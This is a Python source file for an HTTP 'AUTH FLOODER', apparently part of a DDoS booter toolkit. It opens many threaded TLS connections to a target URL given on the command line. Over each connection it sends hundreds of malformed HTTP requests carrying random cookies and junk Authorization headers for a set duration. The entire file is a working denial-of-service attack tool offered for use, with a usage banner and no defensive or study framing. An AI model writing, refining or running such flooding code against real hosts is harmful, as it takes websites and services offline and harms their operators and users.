import socket,ssl,threading,random
from MODEL.data import generate_url_path,get_target,gen_ips

def AUTH(target,methods,duration_sec_attack_dude):
    for _ in range(int(duration_sec_attack_dude)):
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((str(target['host']),int(target['port'])))
            s.connect_ex((str(target['host']),int(target['port'])))
            ssl_context = ssl.SSLContext()
            ssl_socket = ssl_context.wrap_socket(s,server_hostname=target['host'])
            url_path = generate_url_path(1)
            url_leak = ''
            if  '/' in target['uri']:
               url_leak = target['uri']
            else:
               url_leak = '/'
            ips = gen_ips()
            byt = f"{methods} {url_leak} HTTP/1.1\nHost: {target['host']}\nCookie: {ips}={generate_url_path(15)}\nAuthorization: {generate_url_path(random.randint(1,25))} /wAeHwBKGhsAW2wdAQIAOv/dqq+/rLzeoba5EJk=\n\n\r\r".encode()
            byt2 = f"{methods} /{url_path} HTTP/1.1\nHost: {target['host']}\nCookie: {ips}={generate_url_path(15)}\nAuthorization: {generate_url_path(random.randint(1,25))} /wAeHwBKGhsAW2wdAQIAOv/dqq+/rLzeoba5EJk=\n\n\r\r".encode()
            for _ in range(500):
                ssl_socket.write(byt2)
                ssl_socket.sendall(byt2)
                ssl_socket.write(byt)
                ssl_socket.send(byt)
            ssl_socket.close()
        except Exception as e:
           print(e)
           pass

import sys
url = ''
METHODS = ''
time_booter = 0
thread_lower = 0
if len(sys.argv) == 5:
   url = sys.argv[1]
   thread_lower = int(sys.argv[2])
   time_booter = int(sys.argv[3])
   METHODS = sys.argv[4]
else:
 print(f'WELCOME TO AUTH FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <METHOD>')
target = get_target(url)
for _ in range(int(thread_lower)):
 threading.Thread(target=AUTH,args=(target,METHODS,time_booter)).start()
 threading.Thread(target=AUTH,args=(target,METHODS,time_booter)).start()
 threading.Thread(target=AUTH,args=(target,METHODS,time_booter)).start()
 threading.Thread(target=AUTH,args=(target,METHODS,time_booter)).start()
 threading.Thread(target=AUTH,args=(target,METHODS,time_booter)).start()